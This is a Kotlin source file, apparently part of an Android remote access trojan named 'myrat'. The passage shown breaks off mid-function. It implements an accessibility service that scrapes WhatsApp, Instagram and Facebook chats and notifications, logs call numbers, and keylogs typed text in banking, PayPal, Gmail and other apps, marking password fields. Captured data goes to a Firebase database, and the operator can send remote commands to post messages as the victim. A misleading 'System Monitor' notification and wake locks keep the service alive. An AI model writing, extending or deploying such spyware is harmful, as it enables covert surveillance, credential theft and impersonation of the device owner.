package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class UnifiedAccessibilityService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val keylogCache = ConcurrentHashMap<String, Long>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 16
    private val CHANNEL_ID = "UnifiedAccessibilityService"
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastNotificationTime = 0L
    private val pendingCommands = mutableListOf<SendCommand>()
    private var isProcessingCommand = false

    // Keylogger specific variables
    private var keyloggerEnabled = false
    private var lastText = ""
    private var lastPackage = ""
    private var lastClassName = ""
    private var textBuffer = StringBuilder()
    private val BUFFER_FLUSH_DELAY = 2000L // 2 seconds
    private var flushRunnable: Runnable? = null

    companion object {
        const val WHATSAPP_PACKAGE = "com.whatsapp"
        const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
        const val INSTAGRAM_PACKAGE = "com.instagram.android"
        const val FACEBOOK_PACKAGE = "com.facebook.katana"
        const val MESSENGER_PACKAGE = "com.facebook.orca"
        const val FACEBOOK_LITE_PACKAGE = "com.facebook.lite"

        // Common dialer app packages
        private val DIALER_PACKAGES = setOf(
            "com.android.dialer",
            "com.google.android.dialer",
            "com.samsung.android.dialer",
            "com.miui.dialer",
            "com.huawei.contacts",
            "com.oneplus.dialer",
            "com.oppo.dialer",
            "com.vivo.dialer",
            "com.realme.dialer"
        )

        // Enhanced view IDs for better compatibility across apps
        private val MESSAGE_TEXT_IDS = listOf(
            "message_text", "text_message", "message_body", "chat_message_text", "message_content",
            "row_thread_item_text_send", "row_thread_item_text_recv", "message_text_view",
            "direct_text_message_text_view", "text_view", "message_bubble_text"
        )
        
        private val CONVERSATION_LAYOUT_IDS = listOf(
            "conversation_layout", "chat_layout", "conversation_container", "chat_container",
            "thread_view", "direct_thread_view", "message_list", "chat_messages_container"
        )
        
        private val CONVERSATIONS_ROW_IDS = listOf(
            "conversations_row", "chat_row", "conversation_item", "chat_item",
            "thread_list_item", "direct_inbox_row", "inbox_item"
        )
        
        private val DATE_IDS = listOf(
            "date", "time", "timestamp", "message_time", "message_timestamp",
            "message_timestamp_text", "time_text"
        )
        
        private val CONTACT_NAME_IDS = listOf(
            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title",
            "thread_title", "direct_thread_title", "username", "display_name"
        )
        
        private val SEARCH_IDS = listOf(
            "menuitem_search", "search", "search_button", "action_search",
            "search_edit_text", "search_bar"
        )
        
        private val SEARCH_INPUT_IDS = listOf(
            "search_input", "search_field", "search_edit_text", "search_src_text",
            "search_box", "query_text"
        )
        
        private val MESSAGE_ENTRY_IDS = listOf(
            "entry", "message_entry", "input_message", "chat_input", "compose_text",
            "message_composer", "text_input", "compose_text_view", "message_edit_text"
        )
        
        private val SEND_IDS = listOf(
            "send", "send_button", "btn_send", "send_message_button",
            "composer_send_button", "send_icon", "voice_note_btn"
        )

        // Call-related view IDs and text patterns
        private val CALL_NUMBER_IDS = listOf(
            "digits", "number", "phone_number", "call_number", "contact_name",
            "caller_name", "incoming_number", "outgoing_number"
        )

        private val CALL_STATE_TEXTS = listOf(
            "calling", "dialing", "ringing", "connected", "ended", "busy",
            "incoming call", "outgoing call", "call ended"
        )

        // Keylogger specific constants
        private val MONITORED_PACKAGES = setOf(
            "com.android.chrome",
            "com.google.android.gm", // Gmail
            "com.facebook.katana", // Facebook
            "com.whatsapp",
            "com.instagram.android",
            "com.twitter.android",
            "com.snapchat.android",
            "com.google.android.apps.messaging", // Messages
            "com.android.mms", // Default SMS
            "com.google.android.inputmethod.latin", // Gboard
            "com.samsung.android.messaging",
            "com.android.settings",
            "com.android.vending", // Play Store
            "com.paypal.android.p2pmobile",
            "com.chase.sig.android",
            "com.bankofamerica.digitalwallet"
        )

        // Input field indicators
        private val INPUT_FIELD_CLASSES = setOf(
            "android.widget.EditText",
            "android.widget.AutoCompleteTextView",
            "android.widget.MultiAutoCompleteTextView",
            "android.support.design.widget.TextInputEditText",
            "androidx.appcompat.widget.AppCompatEditText",
            "com.google.android.material.textfield.TextInputEditText"
        )

        // Password field indicators
        private val PASSWORD_HINTS = setOf(
            "password", "pass", "pwd", "pin", "passcode", "secret",
            "login", "signin", "auth", "credential", "security"
        )
    }

    data class SendCommand(
        val recipient: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("UnifiedAccessibilityService started for deviceId: $deviceId")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForCommands()
            setupNotificationMonitoring()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create UnifiedAccessibilityService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "UnifiedAccessibilityService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour

            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "UnifiedAccessibilityService:ScreenWake"
            )

            Logger.log("Wake locks acquired for UnifiedAccessibilityService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "Unified Accessibility Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Monitor")
                .setContentText("Monitoring WhatsApp, Social Media, Calls, and Input")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start unified foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY

                // Monitor all packages for comprehensive functionality
                packageNames = null // null means all packages

                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Unified accessibility service configured")
        } catch (e: Exception) {
            Logger.error("Failed to setup unified accessibility service", e)
        }
    }

    private fun setupNotificationMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    delay(2000) // Check every 2 seconds

                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in notification monitoring", e)
                }
            }
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000) // Check every second for commands

                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextCommand() {
        if (isProcessingCommand || pendingCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingCommands.removeAt(0)
            Logger.log("Processing unified command: ${command.recipient} - ${command.message}")

            wakeUpScreen()
            sendMessage(command.recipient, command.message, command.packageName)

            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for interaction")

                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000) // 30 seconds
                        Logger.log("Screen wake lock acquired")
                    }
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    try {
                        val intent = Intent(Intent.ACTION_MAIN).apply {
                            addCategory(Intent.CATEGORY_HOME)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to wake screen with intent", e)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    val removedKeylogEntries = keylogCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedKeylogEntries.forEach { keylogCache.remove(it.key) }
                    if (removedEntries.isNotEmpty() || removedKeylogEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size + removedKeylogEntries.size} entries")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return

        scope.launch {
            try {
                // Handle different app types
                when {
                    packageName in arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE) -> {
                        handleWhatsAppEvent(event, packageName)
                    }
                    packageName in arrayOf(INSTAGRAM_PACKAGE, FACEBOOK_PACKAGE, MESSENGER_PACKAGE, FACEBOOK_LITE_PACKAGE) -> {
                        handleSocialMediaEvent(event, packageName)
                    }
                    packageName in DIALER_PACKAGES -> {
                        handleCallEvent(event, packageName)
                    }
                }

                // Handle keylogger for all apps if enabled
                if (keyloggerEnabled) {
                    handleKeyloggerEvent(event, packageName)
                }
            } catch (e: Exception) {
                Logger.error("Error processing unified accessibility event: ${e.message}", e)
            }
        }
    }

    private fun handleWhatsAppEvent(event: AccessibilityEvent, packageName: String) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleWhatsAppContentChange(event, packageName)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWhatsAppWindowStateChange(event, packageName)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleWhatsAppNotificationChange(event, packageName)
            }
        }
    }

    private fun handleSocialMediaEvent(event: AccessibilityEvent, packageName: String) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleSocialMediaContentChange(event, packageName)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleSocialMediaWindowStateChange(event, packageName)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleSocialMediaNotificationChange(event, packageName)
            }
        }
    }

    private fun handleCallEvent(event: AccessibilityEvent, packageName: String) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleCallContentChange(event, packageName)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleCallWindowStateChange(event, packageName)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleCallViewClick(event, packageName)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleCallNotificationChange(event, packageName)
            }
        }
    }

    private fun handleKeyloggerEvent(event: AccessibilityEvent, packageName: String) {
        val className = event.className?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleKeyloggerTextChanged(event, packageName, className)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleKeyloggerViewFocused(event, packageName, className)
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleKeyloggerViewClicked(event, packageName, className)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleKeyloggerWindowStateChanged(event, packageName, className)
            }
        }
    }

    // WhatsApp specific handlers
    private fun handleWhatsAppContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadWhatsAppMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp content change", e)
        }
    }

    private fun handleWhatsAppWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatListScreen(rootNode, packageName)) {
                extractWhatsAppChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp window state change", e)
        }
    }

    private fun handleWhatsAppNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val timestamp = System.currentTimeMillis()

            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New WhatsApp message from notification: $sender -> $message")
                        uploadWhatsAppMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp notification change", e)
        }
    }

    // Social Media specific handlers
    private fun handleSocialMediaContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadSocialMediaMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media content change", e)
        }
    }

    private fun handleSocialMediaWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatListScreen(rootNode, packageName)) {
                extractSocialMediaChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media window state change", e)
        }
    }

    private fun handleSocialMediaNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val timestamp = System.currentTimeMillis()

            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "platform" to getPlatformName(packageName),
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New social media message from notification: $sender -> $message (${getPlatformName(packageName)})")
                        uploadSocialMediaMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media notification change", e)
        }
    }

    // Call specific handlers
    private fun handleCallContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isCallScreen(rootNode, packageName)) {
                extractCallInformation(packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling call content change", e)
        }
    }

    private fun handleCallWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val className = event.className?.toString() ?: return
            Logger.log("Call window state changed in $packageName: $className")

            val isCallScreen = className.contains("call", ignoreCase = true) ||
                    className.contains("incall", ignoreCase = true) ||
                    className.contains("dialer", ignoreCase = true)

            if (isCallScreen) {
                extractCallInformation(packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling call window state change", e)
        }
    }

    private fun handleCallViewClick(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("Call view clicked in $packageName: $text")

            val lowerText = text.lowercase()
            if (lowerText.contains("call") || lowerText.contains("dial")) {
                extractCallInformation(packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling call view click", e)
        }
    }

    private fun handleCallNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("Call notification in $packageName: $text")

            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null) {
                reportCallNumber(phoneNumber, "notification_$packageName")
            }
        } catch (e: Exception) {
            Logger.error("Error handling call notification change", e)
        }
    }

    // Keylogger specific handlers
    private fun handleKeyloggerTextChanged(event: AccessibilityEvent, packageName: String, className: String) {
        try {
            val currentText = event.text?.joinToString("") ?: return
            if (currentText.isBlank()) return

            if (!isInputField(className, event.source)) return

            val isPasswordField = isPasswordField(event.source)
            val fieldType = if (isPasswordField) "password" else "text"

            if (currentText != lastText && currentText.length > lastText.length) {
                val newChars = currentText.substring(lastText.length)
                
                textBuffer.append(newChars)
                scheduleBufferFlush(packageName, className, fieldType)
                
                Logger.log("Text input detected in $packageName: ${if (isPasswordField) "[PASSWORD]" else newChars}")
            }

            lastText = currentText
            lastPackage = packageName
            lastClassName = className
        } catch (e: Exception) {
            Logger.error("Error handling keylogger text changed event", e)
        }
    }

    private fun handleKeyloggerViewFocused(event: AccessibilityEvent, packageName: String, className: String) {
        try {
            val source = event.source ?: return
            
            if (isInputField(className, source)) {
                val fieldInfo = getFieldInfo(source)
                
                logKeylogEvent(
                    packageName = packageName,
                    className = className,
                    eventType = "field_focused",
                    text = "",
                    fieldType = fieldInfo.type,
                    fieldHint = fieldInfo.hint,
                    fieldId = fieldInfo.id
                )
                
                Logger.log("Input field focused in $packageName: ${fieldInfo.type}")
            }
        } catch (e: Exception) {
            Logger.error("Error handling keylogger view focused event", e)
        }
    }

    private fun handleKeyloggerViewClicked(event: AccessibilityEvent, packageName: String, className: String) {
        try {
            val source = event.source ?: return
            val text = source.text?.toString() ?: ""
            
            if (text.isNotEmpty() && isImportantButton(text)) {
                logKeylogEvent(
                    packageName = packageName,
                    className = className,
                    eventType = "button_clicked",
                    text = text,
                    fieldType = "button",
                    fieldHint = "",
                    fieldId = source.viewIdResourceName ?: ""
                )
                
                Logger.log("Important button clicked in $packageName: $text")
            }
        } catch (e: Exception) {
            Logger.error("Error handling keylogger view clicked event", e)
        }
    }

    private fun handleKeyloggerWindowStateChanged(event: AccessibilityEvent, packageName: String, className: String) {
        try {
            if (packageName != lastPackage) {
                flushTextBuffer()
            }
            
            logKeylogEvent(
                packageName = packageName,
                className = className,
                eventType = "app_opened",
                text = "",
                fieldType = "navigation",
                fieldHint = "",
                fieldId = ""
            )
            
            Logger.log("App opened: $packageName")
        } catch (e: Exception) {
            Logger.error("Error handling keylogger window state changed event", e)
        }
    }

    // Command listeners
    private fun listenForCommands() {
        try {
            // WhatsApp commands
            val whatsappSendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
            val whatsappListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE

                            Logger.log("Received WhatsApp send command for $number: $message ($packageName)")
                            pendingCommands.add(SendCommand(number, message, packageName))
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing WhatsApp send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read WhatsApp send command: ${error.message}")
                }
            }
            valueEventListener["whatsappSendCommands"] = whatsappListener
            whatsappSendRef.addValueEventListener(whatsappListener)

            // Social Media commands
            val socialMediaSendRef = db.child("Device").child(deviceId).child("social_media/commands")
            val socialMediaListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val username = command.child("username").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: INSTAGRAM_PACKAGE

                            Logger.log("Received social media send command for $username: $message (${getPlatformName(packageName)})")
                            pendingCommands.add(SendCommand(username, message, packageName))
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing social media send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read social media send command: ${error.message}")
                }
            }
            valueEventListener["socialMediaSendCommands"] = socialMediaListener
            socialMediaSendRef.addValueEventListener(socialMediaListener)

            // Keylogger commands
            val keyloggerCommandRef = db.child("Device").child(deviceId).child("keylogger_commands")
            val keyloggerListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
                            val action = command["action"] as? String ?: return@forEach
                            val commandId = commandSnapshot.key ?: return@forEach
                            val status = command["status"] as? String ?: return@forEach

                            if (status == "pending") {
                                Logger.log("Processing keylogger command: $action with ID: $commandId")
                                
                                when (action) {
                                    "enable" -> {
                                        keyloggerEnabled = true
                                        updateKeyloggerStatus(commandId, "enabled", null)
                                        Logger.log("Keylogger enabled")
                                    }
                                    "disable" -> {
                                        keyloggerEnabled = false
                                        flushTextBuffer()
                                        updateKeyloggerStatus(commandId, "disabled", null)
                                        Logger.log("Keylogger disabled")
                                    }
                                    "getStatus" -> {
                                        updateKeyloggerStatus(commandId, if (keyloggerEnabled) "enabled" else "disabled", null)
                                    }
                                }
                                
                                commandSnapshot.ref.removeValue()
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing keylogger commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Keylogger commands listener cancelled", error.toException())
                }
            }
            valueEventListener["keyloggerCommands"] = keyloggerListener
            keyloggerCommandRef.addValueEventListener(keyloggerListener)

        } catch (e: Exception) {
            Logger.error("Error setting up command listeners", e)
        }
    }

    // Helper methods for message sending
    private suspend fun sendMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send message to $recipient via $packageName")

            wakeUpScreen()
            delay(1000)

            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            } ?: run {
                Logger.error("$packageName not installed")
                return
            }

            startActivity(intent)
            delay(4000)

            navigateToMessages(packageName)
            delay(2000)

            if (searchForRecipient(recipient, packageName)) {
                delay(2000)
                
                if (sendMessageToRecipient(message, packageName)) {
                    Logger.log("🎉 Successfully sent message to $recipient ($packageName)")
                    
                    val messageData = mapOf(
                        "sender" to "You",
                        "recipient" to recipient,
                        "content" to message,
                        "timestamp" to System.currentTimeMillis(),
                        "type" to "Sent",
                        "isNewContact" to !contactCache.containsKey(recipient),
                        "uploaded" to System.currentTimeMillis(),
                        "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                        "packageName" to packageName,
                        "platform" to getPlatformName(packageName),
                        "direction" to "Sent",
                        "source" to "command"
                    )
                    
                    if (packageName in arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)) {
                        uploadWhatsAppMessage(messageData)
                    } else {
                        uploadSocialMediaMessage(messageData)
                    }
                }
            }

            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending message ($packageName): ${e.message}", e)

            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    // Helper methods (shared across all functionalities)
    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATION_LAYOUT_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATIONS_ROW_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun isCallScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CALL_NUMBER_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            MESSAGE_TEXT_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun getPlatformName(packageName: String): String {
        return when (packageName) {
            WHATSAPP_PACKAGE -> "WhatsApp"
            WHATSAPP_BUSINESS_PACKAGE -> "WhatsApp Business"
            INSTAGRAM_PACKAGE -> "Instagram"
            FACEBOOK_PACKAGE -> "Facebook"
            MESSENGER_PACKAGE -> "Messenger"
            FACEBOOK_LITE_PACKAGE -> "Facebook Lite"
